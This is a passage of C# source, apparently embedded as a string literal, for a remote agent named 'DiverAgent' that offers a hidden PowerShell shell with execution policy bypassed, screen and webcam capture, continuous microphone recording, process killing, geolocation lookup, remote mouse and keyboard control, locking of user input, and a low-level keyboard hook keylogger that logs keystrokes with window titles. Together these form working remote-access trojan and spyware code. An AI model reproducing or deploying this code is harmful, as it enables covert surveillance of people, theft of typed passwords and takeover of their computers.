                if (string.IsNullOrWhiteSpace(cmd)) return (false, "empty command");

                lock (ShellLock)
                {
                    try
                    {
                        if (ShellProc is null || ShellProc.HasExited)
                        {
                            ShellOut.Clear();
                            ShellErr.Clear();
                            ShellProc = new Process
                            {
                                StartInfo = new ProcessStartInfo("powershell.exe",
                                    "-NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -")
                                {
                                    UseShellExecute = false,
                                    RedirectStandardInput = true,
                                    RedirectStandardOutput = true,
                                    RedirectStandardError = true,
                                    CreateNoWindow = true,
                                    StandardOutputEncoding = Encoding.UTF8,
                                    StandardErrorEncoding = Encoding.UTF8
                                }
                            };
                            ShellProc.Start();
                            DrainPipe(ShellProc.StandardOutput, ShellOut);
                            DrainPipe(ShellProc.StandardError, ShellErr);
                        }

                        var marker = "__DIVERDONE" + Guid.NewGuid().ToString("N") + "__";
                        ShellProc.StandardInput.WriteLine(cmd);
                        ShellProc.StandardInput.WriteLine("Write-Output '" + marker + "'");
                        ShellProc.StandardInput.Flush();

                        var output = new StringBuilder();
                        var error = new StringBuilder();
                        var deadline = DateTime.UtcNow.AddSeconds(30);
                        bool done = false;

                        while (DateTime.UtcNow < deadline)
                        {
                            string? line;
                            while (ShellOut.TryDequeue(out line))
                            {
                                if (line.Contains(marker)) { done = true; continue; }
                                if (done) continue;
                                output.AppendLine(line);
                            }
                            while (ShellErr.TryDequeue(out line)) error.AppendLine(line);
                            if (done) break;
                            Thread.Sleep(40);
                        }

                        if (!done)
                        {
                            try { ShellProc.Kill(); } catch { }
                            ShellProc = null;
                        }

                        var text = (output.ToString() + error.ToString()).Trim();
                        return (true, string.IsNullOrEmpty(text) ? "(no output)" : text);
                    }
                    catch (Exception ex)
                    {
                        return (false, ex.Message);
                    }
                }
            }

            private static (bool, string) ListDirectory(string path)
            {
                try
                {
                    var dirs = Directory.GetDirectories(path).OrderBy(d => d, StringComparer.OrdinalIgnoreCase)
                        .Select(d => new { name = Path.GetFileName(d), kind = "Folder", size = 0L });
                    var files = Directory.GetFiles(path).OrderBy(f => f, StringComparer.OrdinalIgnoreCase)
                        .Select(f => new { name = Path.GetFileName(f), kind = "File", size = new FileInfo(f).Length });
                    return (true, JsonSerializer.Serialize(new { path = Path.GetFullPath(path), entries = dirs.Concat(files) }));
                }
                catch (Exception ex)
                {
                    return (false, ex.Message);
                }
            }

            private static (bool, string) CaptureScreen(Dictionary<string, string>? args)
            {
                var all = Screen.AllScreens;
                int index = 0;
                if (args != null && args.TryGetValue("screen", out var s) && int.TryParse(s, out var parsed)
                    && parsed >= 0 && parsed < all.Length)
                    index = parsed;
                else
                {
                    var primaryIdx = Array.FindIndex(all, sc => sc.Primary);
                    if (primaryIdx >= 0) index = primaryIdx;
                }

                Exception? last = null;
                for (int attempt = 0; attempt < 3; attempt++)
                {
                    try
                    {
                        var bounds = all[index].Bounds;
                        if (bounds.Width <= 0 || bounds.Height <= 0)
                            return (false, "screen not available");

                        using var bmp = new Bitmap(bounds.Width, bounds.Height);
                        using (var g = Graphics.FromImage(bmp))
                            g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bmp.Size);
                        using var ms = new MemoryStream();
                        bmp.Save(ms, ImageFormat.Png);
                        return (true, Convert.ToBase64String(ms.ToArray()));
                    }
                    catch (Exception ex)
                    {
                        // Transient (screen locked, UAC secure desktop, display change) - retry briefly
                        last = ex;
                        Thread.Sleep(200);
                    }
                }
                return (false, last?.Message ?? "capture failed");
            }

            private static (bool, string) ListScreens()
            {
                var list = new List<object>();
                for (int i = 0; i < Screen.AllScreens.Length; i++)
                {
                    var sc = Screen.AllScreens[i];
                    list.Add(new { index = i, name = sc.DeviceName, width = sc.Bounds.Width, height = sc.Bounds.Height, primary = sc.Primary });
                }
                return (true, JsonSerializer.Serialize(list));
            }

            private static (bool, string) ListCameras()
            {
                var list = new List<object>();
                var devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                for (int i = 0; i < devices.Count; i++)
                    list.Add(new { index = i, name = devices[i].Name });
                return (true, JsonSerializer.Serialize(list));
            }

            private static (bool, string) CaptureCamera(int index)
            {
                var devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (devices.Count == 0) return (false, "No camera device found");
                if (index < 0 || index >= devices.Count) return (false, $"Invalid camera index {index}");

                var capture = new VideoCaptureDevice(devices[index].MonikerString);
                using var ready = new ManualResetEventSlim(false);
                Bitmap? frame = null;
                capture.NewFrame += (_, e) =>
                {
                    frame = new Bitmap(e.Frame);
                    ready.Set();
                };
                capture.Start();

                var got = ready.Wait(TimeSpan.FromSeconds(10));
                capture.SignalToStop();
                capture.WaitForStop();

                if (!got || frame == null) return (false, "no frame received from camera");
                using var ms = new MemoryStream();
                frame.Save(ms, ImageFormat.Jpeg);
                frame.Dispose();
                return (true, Convert.ToBase64String(ms.ToArray()));
            }

            private static (bool, string) ListMicrophones()
            {
                var list = new List<object>();
                for (int i = 0; i < WaveInEvent.DeviceCount; i++)
                {
                    try { list.Add(new { index = i, name = WaveInEvent.GetCapabilities(i).ProductName }); }
                    catch { }
                }
                return (true, JsonSerializer.Serialize(list));
            }

            private static class MicRecorder
            {
                private static readonly object Sync = new();
                private static readonly MemoryStream Buffer = new();
                private static WaveInEvent? _waveIn;

                public static void Start(int deviceIndex)
                {
                    Stop();
                    var waveIn = new WaveInEvent
                    {
                        DeviceNumber = deviceIndex,
                        BufferMilliseconds = 50,
                        WaveFormat = new WaveFormat(16000, 16, 1)
                    };
                    waveIn.DataAvailable += (_, e) =>
                    {
                        lock (Sync)
                        {
                            if (Buffer.Length > 200_000)
                            {
                                var arr = Buffer.ToArray();
                                Buffer.SetLength(0);
                                Buffer.Write(arr, arr.Length - 100_000, 100_000);
                            }
                            Buffer.Write(e.Buffer, 0, e.BytesRecorded);
                        }
                    };
                    waveIn.StartRecording();
                    _waveIn = waveIn;
                }

                public static string? Drain()
                {
                    lock (Sync)
                    {
                        if (Buffer.Length == 0) return null;
                        var pcm = Buffer.ToArray();
                        Buffer.SetLength(0);
                        return Convert.ToBase64String(BuildWav(pcm));
                    }
                }

                public static void Stop()
                {
                    var w = _waveIn;
                    _waveIn = null;
                    if (w != null)
                    {
                        try { w.StopRecording(); } catch { }
                        w.Dispose();
                    }
                    lock (Sync) Buffer.SetLength(0);
                }

                private static byte[] BuildWav(byte[] pcm)
                {
                    const int sampleRate = 16000;
                    using var ms = new MemoryStream();
                    using var w = new BinaryWriter(ms);
                    w.Write(0x46464952);
                    w.Write(36 + pcm.Length);
                    w.Write(0x45564157);
                    w.Write(0x20746D66);
                    w.Write(16);
                    w.Write((short)1);
                    w.Write((short)1);
                    w.Write(sampleRate);
                    w.Write(sampleRate * 2);
                    w.Write((short)2);
                    w.Write((short)16);
                    w.Write(0x61746164);
                    w.Write(pcm.Length);
                    w.Write(pcm);
                    w.Flush();
                    return ms.ToArray();
                }
            }

            private static readonly Dictionary<int, (TimeSpan Cpu, DateTime At)> ProcSamples = new();

            private static (bool, string) ListProcesses()
            {
                var now = DateTime.UtcNow;
                var items = new List<(int pid, string name, double cpu, double mem, string title)>();
                var samples = new Dictionary<int, (TimeSpan, DateTime)>();
                foreach (var p in Process.GetProcesses())
                {
                    try
                    {
                        var cpu = TimeSpan.Zero;
                        try { cpu = p.TotalProcessorTime; } catch { }
                        var mem = 0.0;
                        try { mem = p.WorkingSet64 / (1024.0 * 1024.0); } catch { }
                        var title = "";
                        try { title = p.MainWindowTitle; } catch { }

                        var cpuPct = 0.0;
                        if (ProcSamples.TryGetValue(p.Id, out var prev) && prev.Cpu != TimeSpan.Zero && cpu != TimeSpan.Zero)
                        {
                            var elapsedMs = (now - prev.At).TotalMilliseconds;
                            var deltaMs = (cpu - prev.Cpu).TotalMilliseconds;
                            if (elapsedMs > 0)
                                cpuPct = deltaMs / elapsedMs * 100.0 / Environment.ProcessorCount;
                        }
                        samples[p.Id] = (cpu, now);
                        items.Add((p.Id, p.ProcessName, Math.Round(cpuPct, 1), Math.Round(mem, 1), title));
                    }
                    catch { }
                }
                ProcSamples.Clear();
                foreach (var kv in samples) ProcSamples[kv.Key] = kv.Value;

                var sorted = items.OrderByDescending(i => i.cpu).ThenByDescending(i => i.mem)
                    .Select(i => new { pid = i.pid, name = i.name, cpu = i.cpu, mem = i.mem, title = i.title });
                return (true, JsonSerializer.Serialize(sorted));
            }

            private static (bool, string) KillProcess(int pid)
            {
                if (pid <= 0) return (false, "invalid process id");
                try
                {
                    using var p = Process.GetProcessById(pid);
                    var name = p.ProcessName;
                    p.Kill(true);
                    return (true, $"terminated {name} ({pid})");
                }
                catch (Exception ex)
                {
                    return (false, ex.Message);
                }
            }

            private static (bool, string) ListInstalledApps()
            {
                var items = new List<(string name, string version, string publisher, string installed, double sizeMb, string uninstall)>();
                var seen = new HashSet<string>();
                var roots = new[]
                {
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
                };
                foreach (var hive in new[] { Microsoft.Win32.Registry.LocalMachine, Microsoft.Win32.Registry.CurrentUser })
                {
                    foreach (var root in roots)
                    {
                        try
                        {
                            using var parent = hive.OpenSubKey(root);
                            if (parent is null) continue;
                            foreach (var sub in parent.GetSubKeyNames())
                            {
                                try
                                {
                                    using var key = parent.OpenSubKey(sub);
                                    if (key is null) continue;
                                    var name = key.GetValue("DisplayName")?.ToString()?.Trim();
                                    if (string.IsNullOrWhiteSpace(name) || name.Length < 2) continue;
                                    var version = key.GetValue("DisplayVersion")?.ToString()?.Trim() ?? "";
                                    var dedupeKey = name + "|" + version;
                                    if (!seen.Add(dedupeKey)) continue;
                                    var quiet = key.GetValue("QuietUninstallString")?.ToString()?.Trim();
                                    var uninstallStr = !string.IsNullOrEmpty(quiet)
                                        ? quiet
                                        : key.GetValue("UninstallString")?.ToString()?.Trim() ?? "";
                                    items.Add((name, version,
                                        key.GetValue("Publisher")?.ToString()?.Trim() ?? "",
                                        key.GetValue("InstallDate")?.ToString()?.Trim() ?? "",
                                        key.GetValue("EstimatedSize") is int kb ? Math.Round(kb / 1024.0, 1) : 0.0,
                                        uninstallStr));
                                }
                                catch { }
                            }
                        }
                        catch { }
                    }
                }
                var sorted = items.OrderBy(i => i.name, StringComparer.OrdinalIgnoreCase)
                    .Select(i => new { name = i.name, version = i.version, publisher = i.publisher, installed = i.installed, sizeMb = i.sizeMb, uninstall = i.uninstall });
                return (true, JsonSerializer.Serialize(sorted));
            }

            private static (bool, string) GetLocation()
            {
                try
                {
                    using var http = new HttpClient { Timeout = TimeSpan.FromSeconds(10) };
                    var json = http.GetStringAsync("http://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,isp,org,query").Result;
                    return (true, json);
                }
                catch (Exception ex)
                {
                    return (false, ex.Message);
                }
            }

            private static (bool, string) ListDrives()
            {
                var list = new List<object>();
                foreach (var d in DriveInfo.GetDrives())
                {
                    if (d.IsReady)
                        list.Add(new { path = d.RootDirectory.FullName, name = $"{d.Name} ({d.VolumeLabel})", type = d.DriveType.ToString() });
                    else
                        list.Add(new { path = d.RootDirectory.FullName, name = $"{d.Name} (not ready)", type = d.DriveType.ToString() });
                }
                return (true, JsonSerializer.Serialize(list));
            }

            private static async Task Send(StreamWriter writer, object message)
            {
                await writer.WriteLineAsync(JsonSerializer.Serialize(message));
            }

            private static string DetectDeviceType()
            {
                try
                {
                    using var key = Microsoft.Win32.Registry.LocalMachine
                        .OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
                    var name = key?.GetValue("ProductName")?.ToString() ?? "";
                    if (name.Contains("Server")) return "Server";
                    if (name.Contains("Home")) return "Laptop";
                    return "Desktop";
                }
                catch
                {
                    return "Desktop";
                }
            }

            private static string GetAgentId()
            {
                try
                {
                    var dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "DiverAgent");
                    var file = Path.Combine(dir, "agent.id");
                    if (File.Exists(file)) return File.ReadAllText(file).Trim();
                    Directory.CreateDirectory(dir);
                    var id = Guid.NewGuid().ToString("N");
                    File.WriteAllText(file, id);
                    return id;
                }
                catch
                {
                    var hash = BitConverter.ToString(BitConverter.GetBytes(Environment.MachineName.GetHashCode())).Replace("-", "").ToLowerInvariant();
                    return "m" + hash;
                }
            }

            private static string GetLocalIp()
            {
                try
                {
                    var host = Dns.GetHostEntry(Dns.GetHostName());
                    foreach (var a in host.AddressList)
                    {
                        if (a.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(a))
                            return a.ToString();
                    }
                }
                catch
                {
                }
                return "?";
            }

            private sealed class Message
            {
                public string Type { get; set; } = "";
                public string? RequestId { get; set; }
                public string? Command { get; set; }
                public Dictionary<string, string>? Args { get; set; }
            }
        }

        internal static class RemoteInput
        {
            [DllImport("user32.dll")] private static extern bool SetCursorPos(int x, int y);
            [DllImport("user32.dll")] private static extern bool GetCursorPos(out POINT lpPoint);
            [DllImport("user32.dll")] private static extern uint SendInput(uint nInputs, INPUT[] pInputs, int cbInput);
            [DllImport("user32.dll")] private static extern short VkKeyScan(char ch);
            [DllImport("user32.dll")] public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, ref uint pvParam, uint fWinIni);

            private const uint INPUT_MOUSE = 0;
            private const uint INPUT_KEYBOARD = 1;
            private const uint MOUSEEVENTF_MOVE = 0x0001;
            private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
            private const uint MOUSEEVENTF_LEFTUP = 0x0004;
            private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
            private const uint MOUSEEVENTF_RIGHTUP = 0x0010;
            private const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
            private const uint MOUSEEVENTF_MIDDLEUP = 0x0040;
            private const uint MOUSEEVENTF_WHEEL = 0x0800;
            private const uint MOUSEEVENTF_ABSOLUTE = 0x8000;
            private const uint KEYEVENTF_KEYUP = 0x0002;

            private const uint SPI_SETBLOCKINPUT = 0x011A;

            [StructLayout(LayoutKind.Sequential)]
            private struct POINT { public int X; public int Y; }

            [StructLayout(LayoutKind.Sequential)]
            private struct MOUSEINPUT
            {
                public int dx; public int dy; public uint mouseData; public uint dwFlags; public uint time; public IntPtr dwExtraInfo;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct KEYBDINPUT
            {
                public ushort wVk; public ushort wScan; public uint dwFlags; public uint time; public IntPtr dwExtraInfo;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct HARDWAREINPUT { public int uMsg; public short wParamL; public short wParamH; }

            [StructLayout(LayoutKind.Explicit)]
            private struct INPUT
            {
                [FieldOffset(0)] public uint type;
                [FieldOffset(8)] public MOUSEINPUT mi;
                [FieldOffset(8)] public KEYBDINPUT ki;
                [FieldOffset(8)] public HARDWAREINPUT hi;
            }

            private static int Arg(Dictionary<string, string>? a, string k, int d = 0) =>
                a != null && a.TryGetValue(k, out var v) && int.TryParse(v, out var p) ? p : d;

            private static int AbsX(int x, int screenW = 0)
            {
                if (screenW == 0) screenW = Screen.PrimaryScreen!.Bounds.Width;
                return Math.Abs(x * 65536 / screenW);
            }
            private static int AbsY(int y, int screenH = 0)
            {
                if (screenH == 0) screenH = Screen.PrimaryScreen!.Bounds.Height;
                return Math.Abs(y * 65536 / screenH);
            }

            public static (bool, string) Move(Dictionary<string, string>? args)
            {
                var x = Arg(args, "x"); var y = Arg(args, "y");
                SetCursorPos(x, y);
                return (true, $"moved {x},{y}");
            }

            public static (bool, string) Click(Dictionary<string, string>? args)
            {
                var x = Arg(args, "x"); var y = Arg(args, "y");
                var button = args != null && args.TryGetValue("button", out var b) ? b : "left";
                SetCursorPos(x, y);
                Thread.Sleep(10);
                var down = button == "right" ? MOUSEEVENTF_RIGHTDOWN : button == "middle" ? MOUSEEVENTF_MIDDLEDOWN : MOUSEEVENTF_LEFTDOWN;
                var up = button == "right" ? MOUSEEVENTF_RIGHTUP : button == "middle" ? MOUSEEVENTF_MIDDLEUP : MOUSEEVENTF_LEFTUP;
                var inputs = new[]
                {
                    new INPUT { type = INPUT_MOUSE, mi = new MOUSEINPUT { dwFlags = down } },
                    new INPUT { type = INPUT_MOUSE, mi = new MOUSEINPUT { dwFlags = up } }
                };
                SendInput((uint)inputs.Length, inputs, Marshal.SizeOf<INPUT>());
                return (true, $"clicked {button} at {x},{y}");
            }

            public static (bool, string) Scroll(Dictionary<string, string>? args)
            {
                var delta = args != null && args.TryGetValue("delta", out var d) && int.TryParse(d, out var p) ? (uint)p : 120u;
                var inputs = new[] { new INPUT { type = INPUT_MOUSE, mi = new MOUSEINPUT { mouseData = delta, dwFlags = MOUSEEVENTF_WHEEL } } };
                SendInput(1, inputs, Marshal.SizeOf<INPUT>());
                return (true, $"scrolled {delta}");
            }

            public static (bool, string) KeyDown(Dictionary<string, string>? args)
            {
                var code = Arg(args, "code");
                var inputs = new[] { new INPUT { type = INPUT_KEYBOARD, ki = new KEYBDINPUT { wVk = (ushort)code, dwFlags = 0 } } };
                SendInput(1, inputs, Marshal.SizeOf<INPUT>());
                return (true, $"keydown {code}");
            }

            public static (bool, string) KeyUp(Dictionary<string, string>? args)
            {
                var code = Arg(args, "code");
                var inputs = new[] { new INPUT { type = INPUT_KEYBOARD, ki = new KEYBDINPUT { wVk = (ushort)code, dwFlags = KEYEVENTF_KEYUP } } };
                SendInput(1, inputs, Marshal.SizeOf<INPUT>());
                return (true, $"keyup {code}");
            }

            public static (bool, string) GetCursor()
            {
                if (GetCursorPos(out var pt))
                    return (true, JsonSerializer.Serialize(new { x = pt.X, y = pt.Y }));
                return (false, "failed");
            }

            public static (bool, string) GetScreenSize()
            {
                var w = Screen.PrimaryScreen!.Bounds.Width;
                var h = Screen.PrimaryScreen!.Bounds.Height;
                return (true, JsonSerializer.Serialize(new { width = w, height = h }));
            }

            public static (bool, string) LockInput(Dictionary<string, string>? args)
            {
                var enable = args != null && args.TryGetValue("enabled", out var e) && e == "1";
                var val = enable ? 1u : 0u;
                SystemParametersInfo(SPI_SETBLOCKINPUT, 0, ref val, 0);
                return (true, enable ? "input locked" : "input unlocked");
            }
        }

        internal static class KeyLogger
        {
            private const int WH_KEYBOARD_LL = 13;
            private const int WM_KEYDOWN = 0x0100;
            private const int WM_KEYUP = 0x0101;

            private const int WM_SYSKEYDOWN = 0x0104;
            private const int WM_SYSKEYUP = 0x0105;
            private static readonly object Sync = new();
            private static readonly StringBuilder Log = new();
            private static IntPtr _hook;
            private static LowLevelKeyboardProc? _proc;
            private static Thread? _thread;
            private static bool _running;
            private static string _lastWindow = "";
            private static string _lastProcess = "";
            private static bool _shiftDown;
            private static bool _ctrlDown;
            private static bool _altDown;
            private static bool _capsLock;

            private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

            public static void Start()
            {
                lock (Sync)
                {
                    if (_running) return;
                    _running = true;
                    _shiftDown = _ctrlDown = _altDown = false;
                    _capsLock = (GetAsyncKeyState(0x14) & 0x01) != 0;
                    _proc = HookCallback;
                    _thread = new Thread(() =>
                    {
                        _hook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(null), 0);
                        while (_running && GetMessage(out var msg, IntPtr.Zero, 0, 0) > 0)
                        {
                            TranslateMessage(ref msg);
                            DispatchMessage(ref msg);
                        }
                    })
                    { IsBackground = true };
                    _thread.Start();
                }
            }

            public static void Stop()
            {
                lock (Sync)
                {
                    _running = false;
                    if (_hook != IntPtr.Zero)
                    {
                        UnhookWindowsHookEx(_hook);
                        _hook = IntPtr.Zero;
                    }
                }
            }

            public static string GetLog()
            {
                lock (Sync) return Log.ToString();
            }

            public static void Clear()
            {
                lock (Sync)
                {
                    Log.Clear();
                    _lastWindow = "";
                    _lastProcess = "";
                }
            }

            private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
            {
                if (nCode >= 0)
                {
                    var vk = (uint)Marshal.ReadInt32(lParam);
                    if (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)
                    {
                        if (IsModifierKey(vk))
                        {
                            TrackModifier(vk, true);
                            return CallNextHookEx(_hook, nCode, wParam, lParam);
                        }
                        var text = KeyText(vk);
                        lock (Sync)
                        {
                            AppendWindowHeader(Log);
                            Log.Append(text);
                        }
                    }
                    else if (wParam == (IntPtr)WM_KEYUP || wParam == (IntPtr)WM_SYSKEYUP)
                    {
                        if (IsModifierKey(vk)) TrackModifier(vk, false);
                    }
                }
                return CallNextHookEx(_hook, nCode, wParam, lParam);
            }

            private static void TrackModifier(uint vk, bool down)
            {
                switch (vk)
                {
                    case 0x10 or 0xA0 or 0xA1: _shiftDown = down; break;
                    case 0x11 or 0xA2 or 0xA3: _ctrlDown = down; break;
                    case 0x12 or 0xA4 or 0xA5: _altDown = down; break;
                    case 0x14: if (down) _capsLock = !_capsLock; break;
                }
            }

            private static string KeyText(uint vk)
            {
                if (_ctrlDown || _altDown)
                    return $"[{ComboPrefix()}{KeyName(vk)}]";

                var state = new byte[256];
                if (_shiftDown) state[0x10] = 0x80;
                if (_ctrlDown) state[0x11] = 0x80;
                if (_altDown) state[0x12] = 0x80;
                if (_capsLock) state[0x14] = 0x01;

                var sc = MapVirtualKey(vk, 0);
                var buf = new StringBuilder(8);
                var n = ToUnicode(vk, sc, state, buf, buf.Capacity, 0);
                if (n > 0) return buf.ToString(0, n);

                switch (vk)
                {
                    case 0x08: return "[BACKSPACE]";
                    case 0x09: return "[TAB]";
                    case 0x0D: return "[ENTER]\r\n";
                    case 0x1B: return "[ESC]";
                    case 0x20: return " ";
                    case 0x2E: return "[DEL]";
                    case 0x25: return "[LEFT]";
                    case 0x26: return "[UP]";
                    case 0x27: return "[RIGHT]";
                    case 0x28: return "[DOWN]";
                    case 0x2D: return "[INS]";
                    case 0x24: return "[HOME]";
                    case 0x23: return "[END]";
                    case 0x21: return "[PGUP]";
                    case 0x22: return "[PGDN]";
                }

                if (vk >= 0x70 && vk <= 0x87) return $"[F{vk - 0x6F}]";
                return "";
            }

            private static string ComboPrefix()
            {
                var prefix = "";
                if (_ctrlDown) prefix += "CTRL+";
                if (_altDown) prefix += "ALT+";
                if (_shiftDown) prefix += "SHIFT+";
                return prefix;
            }

            private static bool IsModifierKey(uint vk) =>
                vk is 0x10 or 0x11 or 0x12 or 0x14 or 0x5B or 0x5C or 0xA0 or 0xA1 or 0xA2 or 0xA3 or 0xA4 or 0xA5;

            private static string KeyName(uint vk)
            {
                if (vk is >= 0x41 and <= 0x5A) return ((char)vk).ToString();
                if (vk >= 0x30 && vk <= 0x39) return ((char)vk).ToString();
                if (vk >= 0x70 && vk <= 0x87) return $"F{vk - 0x6F}";
                switch (vk)
                {
                    case 0x08: return "BACKSPACE";
                    case 0x09: return "TAB";
                    case 0x0D: return "ENTER";
                    case 0x1B: return "ESC";
                    case 0x20: return "SPACE";
                    case 0x2E: return "DEL";
                    case 0x25: return "LEFT";
                    case 0x26: return "UP";
                    case 0x27: return "RIGHT";
                    case 0x28: return "DOWN";
                    case 0x2D: return "INS";
                    case 0x24: return "HOME";
                    case 0x23: return "END";
                    case 0x21: return "PGUP";
                    case 0x22: return "PGDN";
                }
                return ((Keys)vk).ToString();
            }

            private static void AppendWindowHeader(StringBuilder sb)
            {
                var hwnd = GetForegroundWindow();
                var process = GetProcessName(hwnd);
                var title = GetWindowTitle(hwnd);
                if (process == _lastProcess && title == _lastWindow) return;
                _lastProcess = process;
                _lastWindow = title;
                sb.Append("\r\n[").Append(DateTime.Now.ToString("HH:mm:ss")).Append("] ");
                sb.Append(string.IsNullOrEmpty(process) ? "?" : process);
                if (!string.IsNullOrEmpty(title))
                    sb.Append(" \u25B8 ").Append(title);
                sb.Append("\r\n");
            }

            private static string GetWindowTitle(IntPtr hwnd)
            {
                var len = GetWindowTextLength(hwnd);
                if (len <= 0) return "";
                var sb = new StringBuilder(len + 1);
                GetWindowText(hwnd, sb, sb.Capacity);
                return sb.ToString().Trim();
            }

            private static string GetProcessName(IntPtr hwnd)
            {
                try
                {
                    GetWindowThreadProcessId(hwnd, out var pid);
                    if (pid == 0) return "";
                    using var p = Process.GetProcessById((int)pid);
                    return p.ProcessName;
                }
                catch
                {
                    return "";
                }
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct MSG
            {
                public IntPtr hwnd;
                public uint message;
                public IntPtr wParam;
                public IntPtr lParam;
                public uint time;
                public System.Drawing.Point pt;
            }

            [DllImport("user32.dll", SetLastError = true)]
            private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

            [DllImport("user32.dll")]
            private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

            [DllImport("user32.dll", SetLastError = true)]
            private static extern bool UnhookWindowsHookEx(IntPtr hhk);

            [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
            private static extern IntPtr GetModuleHandle(string? lpModuleName);

            [DllImport("user32.dll")]
            private static extern int GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

            [DllImport("user32.dll")]
            private static extern bool TranslateMessage(ref MSG lpMsg);

            [DllImport("user32.dll")]
            private static extern IntPtr DispatchMessage(ref MSG lpMsg);

            [DllImport("user32.dll")]
            private static extern uint MapVirtualKey(uint uCode, uint uMapType);

            [DllImport("user32.dll")]
            private static extern short GetAsyncKeyState(int vKey);

            [DllImport("user32.dll")]
            private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags);

            [DllImport("user32.dll")]
            private static extern IntPtr GetForegroundWindow();

            [DllImport("user32.dll", CharSet = CharSet.Unicode)]
            private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

            [DllImport("user32.dll")]
            private static extern int GetWindowTextLength(IntPtr hWnd);

            [DllImport("user32.dll")]
            private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
        }

        """;
    }
}
